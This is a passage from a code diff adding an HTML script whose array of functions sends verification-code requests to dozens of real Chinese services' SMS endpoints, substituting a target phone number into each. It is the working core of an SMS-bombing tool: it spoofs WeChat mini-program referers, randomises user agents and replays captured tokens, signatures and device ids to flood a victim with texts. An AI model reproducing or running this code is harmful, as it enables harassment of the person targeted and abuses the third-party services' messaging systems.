+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_27(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://admin.wumazhnmg.com/zmd-service-base/other/getSmsCode?mobile=${phone}`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_28(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://sh.leakeyun.com/weapp/base/sendvalidate";
+        const headers = {
+            "Host": "sh.leakeyun.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "company": "sxthf_TH2024",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx31a84ba4f865c5ca/5/page-frame.html"
+        };
+        let data = "{\"phone\":\"13800000000\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_30(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://member-purchase.hbxinfadi.com/api/open/member/sms";
+        const headers = {
+            "Host": "member-purchase.hbxinfadi.com",
+            "Connection": "keep-alive",
+            "authorization": "111",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json; charset=UTF-8",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "app-version": "2.2.4",
+            "Referer": "https://servicewechat.com/wx5e1817bd2ac2f220/204/page-frame.html"
+        };
+        let data = "{\"mobile\":\"13800000000\",\"tdc_id\":81,\"PhoneDeviceInfo\":{\"brand\":\"apple\",\"deviceBrand\":\"apple\",\"deviceId\":\"17656331022864097366\",\"deviceModel\":\"V2404A\",\"deviceOrientation\":\"portrait\",\"devicePixelRatio\":3.5,\"model\":\"V2404A\",\"system\":\"Android 14\",\"networkType\":\"wifi\",\"isConnected\":true}}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_32(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://v8mp.600vip.cn/api/GeneralInterface/SendValidationCode";
+        const headers = {
+            "Host": "v8mp.600vip.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "mp_api_shopid": "",
+            "content-type": "application/json",
+            "mp_api_compcode": "18679393949",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx165676254d5f5c01/1/page-frame.html"
+        };
+        let data = "{\"Mobile\":\"13800000000\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_34(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://uc.17win.com/sms/v4/web/verificationCode/send?mobile=${phone}&scene=bind&isVoice=N&appId=70774617641171202208031508899`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_35(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://mcpwxp.motherchildren.com/cloud/ppclient/msg/getauthcode";
+        const headers = {
+            "Host": "mcpwxp.motherchildren.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx38285c6799dac2d1/284/page-frame.html"
+        };
+        let data = "{\"organCode\":\"HXD2\",\"appCode\":\"HXFYAPP\",\"channelCode\":\"PATIENT_WECHAT_APPLET\",\"phoneNum\":\"13800000000\",\"busiCode\":\"hyt_account\",\"tempCode\":\"normal\",\"clientId\":\"ooo9znbykh\",\"needCheck\":false}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_38(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://xcx.padtf.com/xcxapi/appuser.php?rec=getsjyzm&phone=${phone}&msgtype=4&session_key=33839c2290cc900dab00e8b39cbda6bd`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_39(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://www.yida178.cn/prod-api/sendRegisterCode/${phone}`;
+        const headers = {
+            "Host": "www.yida178.cn",
+            "Connection": "keep-alive",
+            "authorization": "Bearer undefined",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "content-language": "zh_CN",
+            "Referer": "https://servicewechat.com/wxba8e24dcc66715a4/56/page-frame.html"
+        };
+        await fetch(url, { method: 'PUT', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_41(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://www.dxylbzj.com/api/app/sms/code";
+        const headers = {
+            "Host": "www.dxylbzj.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json;charset=utf-8",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxa1d158d450bd2f57/9/page-frame.html"
+        };
+        let data = "{\"phone\":\"13800000000\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_42(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://cx-hmb.zkydib.com/hmb-js26/api/v1/user/register/sms";
+        const headers = {
+            "Host": "cx-hmb.zkydib.com",
+            "Connection": "keep-alive",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
+            "X-PI-PRO-NUM": "CITY00000022",
+            "sec-ch-ua-mobile": "?1",
+            "User-Agent": generateRandomUserAgent(),
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "projectId": "PJ000059",
+            "Origin": "https://cx-hmb.zkydib.com",
+            "X-Requested-With": "com.tencent.mobileqq",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://cx-hmb.zkydib.com/js26/?t=1765684968808",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        };
+        let data = "{\"phoneNo\":\"13800000000\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_43(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://api.hamptonhotels.com.cn/api/User/SendMobileCode";
+        const headers = {
+            "Host": "api.hamptonhotels.com.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "x-auth-header": "a0eemh+SwGEvHHT77TqR0ty9yqUPqYQjeY0wg4TJgOkFjF1ni3mjHxX2Z3dnKlKX9wJ3XViyZlpG423AnsOi/agDcnMElZbdIXqmKVemSQc7119hAzk1pmIoxuyyctlOugOAGN8Ii9ReUGPYTxQh8lTE7aBv2XV5q/ar/E0uFjetT1Y8IMbRWmw/WCp7x/Ad|1|" + getCurrentTimestamp(),
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxb9a76c5f2625cfc9/231/page-frame.html"
+        };
+        let data = "{\"reqid\":35,\"mobile\":\"15915637092\",\"no_valid_code\":true}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_44(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://w.argylehotels.com/hsgroup/api/sms-vcode?phoneNo=${phone}&orgId=001`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_45(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://public.hikparking.com/api/driver/v2/api/sendVerifyCode";
+        const headers = {
+            "Host": "public.hikparking.com",
+            "Connection": "keep-alive",
+            "authorization": "",
+            "clienttype": "8",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx1db9f853c02f4bd7/60/page-frame.html"
+        };
+        let data = "{\"phone\":\"15915637092\",\"type\":1,\"random\":67,\"sign\":\"21bf8482004d5291ff0c5d04f49561c5\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_46(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://xtzhtc.cn/acct_security/code/sms?mobile=${phone}`;
+        const headers = {
+            "Host": "xtzhtc.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "deviceid": "1765704685811908070",
+            "Referer": "https://servicewechat.com/wx7f4189124b248255/50/page-frame.html"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_50(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg";
+        const headers = {
+            "Host": "dlmixc-parking.lncrland.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html"
+        };
+        let data = "{\"phone\":\"15915637092\",\"tempType\":\"ZL\",\"channel\":\"MINI\",\"length\":4}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_51(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://tsms1.sctfia.com/captcha_send?phone=${phone}`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_52(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://php.51jjcx.com/user/Login/sendSMStttt_123";
+        const headers = {
+            "Host": "php.51jjcx.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "accept": "application/json, text/plain, */*",
+            "Referer": "https://servicewechat.com/wxfaa1ea1ef2c2be3f/231/page-frame.html"
+        };
+        let data = "phone=15915637092&sign=vepMXAyON4Y2iUmCU8kBK00Wp4jnyWK6WSVlCR86oDLEOYyIM0Z%2FqSwWpTG1hxGB7LVvA8OLZqG9FFOaku2X33spidhBYWG%2B8iwX9%2BottphviMiG2JL%2By6zta3bxGrgYOGu8Nmii6VfiVyoU1clid3F7CLodljKhuuY1IVEbOFxSZ16C%2Fcag%2FOy4UUUlzXvsSwFv4K5%2FFLX5QV3GKhtxqF6aEcUqLJquJPDUNq%2GOZZuaRnb%2B%2Bz9wtJvTk%2BHKnDbIUmNuolvqFTOM%2BV7WS0AvUsSCVgKhHoQsUf7Lz2j0kr1PC1X78mPEn82nz8%2BAl6%2FAFSNHDeoknBTzpnNgmrm5OQ%3D%3D";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_53(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://skyclient.shangshuikeji.cn/h5/v1/passenger/user/wx/sendVerifyCode";
+        const headers = {
+            "Host": "skyclient.shangshuikeji.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json;charset=UTF-8",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "_yy_cid": "100001",
+            "Referer": "https://servicewechat.com/wx0f7efcce0dffa575/300/page-frame.html"
+        };
+        let data = "{\"channelId\":\"100001\",\"sdk\":\"3.8.12\",\"deviceModel\":\"V2403A\",\"appversion\":\"release/feat_20251204\",\"pf\":2,\"channel\":\"wechat_applet\",\"openId\":\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\",\"commonParams\":\"{\\\"sdk\\\":\\\"3.8.12\\\",\\\"deviceModel\\\":\\\"V2403A\\\",\\\"appversion\\\":\\\"release/feat_20251204\\\",\\\"pf\\\":2,\\\"channel\\\":\\\"wechat_applet\\\",\\\"openId\\\":\\\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\\\"}\",\"mobile\":\"15915637092\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_56(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://mini.shangyubike.com/USER-SERVICE/sms/sendValidCode?mobileNo=${phone}&reqType=Regist`;
+        const headers = {
+            "User-Agent": generateRandomUserAgent(),
+            "Accept-Encoding": "gzip, deflate, br"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_57(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://appdl.zzcyjt.com:60044/api/person/getLoginCode";
+        const headers = {
+            "Host": "appdl.zzcyjt.com:60044",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxba28c1653b77e510/215/page-frame.html"
+        };
+        let data = "{\"phoneNumber\":\"15915637093\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_58(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://load.dingdatech.com/api/uum/security/getVcode";
+        const headers = {
+            "Host": "load.dingdatech.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wxf7c61a26a092859c/60/page-frame.html"
+        };
+        let data = "{\"appId\":\"mtacf84f3423b0e6132\",\"phoneNO\":\"15915637093\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_59(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://www.xtjfcd.com/api/api-service/api/getCode";
+        const headers = {
+            "Host": "www.xtjfcd.com",
+            "Connection": "keep-alive",
+            "authorization": "",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "Referer": "https://servicewechat.com/wx9fb2b19202fa5717/38/page-frame.html"
+        };
+        let data = "{\"phoneNo\":\"13800000000\",\"sellerNo\":\"xt\",\"type\":\"3\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_60(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = `https://erp.fjtantu.cn/api/sys/getSmsCode?phone=${phone}`;
+        const headers = {
+            "Host": "erp.fjtantu.cn",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json;charset=utf-8",
+            "source": "7",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "cache-control": "no-cache",
+            "accept-charset": "utf-8",
+            "x-access-token": "",
+            "Referer": "https://servicewechat.com/wx120464bb36389b2b/25/page-frame.html"
+        };
+        await fetch(url, { method: 'GET', headers, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_61(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://api.yccsparking.com/yccstc-service-api/account/getPin";
+        const headers = {
+            "Host": "api.yccsparking.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "accept": "application/json",
+            "Referer": "https://servicewechat.com/wx8c0f477b635e9b93/87/page-frame.html"
+        };
+        let data = "{\"mobilenum\":\"15915637098\",\"pinlength\":6,\"verify_key\":\"\",\"verify_code\":\"\",\"from\":\"3\",\"utoken\":\"\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+},
+async function send_sms_63(phone) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+        const url = "https://www.kyxtpt.com/auth/api/v1/login/sms-valid-code-send";
+        const headers = {
+            "Host": "www.kyxtpt.com",
+            "Connection": "keep-alive",
+            "charset": "utf-8",
+            "User-Agent": generateRandomUserAgent(),
+            "content-type": "application/json",
+            "Accept-Encoding": "gzip,compress,br,deflate",
+            "6zubypya": "[object Undefined]",
+            "Referer": "https://servicewechat.com/wx9876543210fedcba/63/page-frame.html"
+        };
+        let data = "{\"phone\":\"13800000000\",\"sendScene\":\"LOGIN\"}";
+        data = replacePhoneInData(data, phone);
+        await fetch(url, { method: 'POST', headers, body: data, signal: controller.signal });
+        clearTimeout(timeout);
+    } catch (e) {
+        clearTimeout(timeout);
+        throw e;
+    }
+}
+];
+</script>
+</body>
+</html>
+
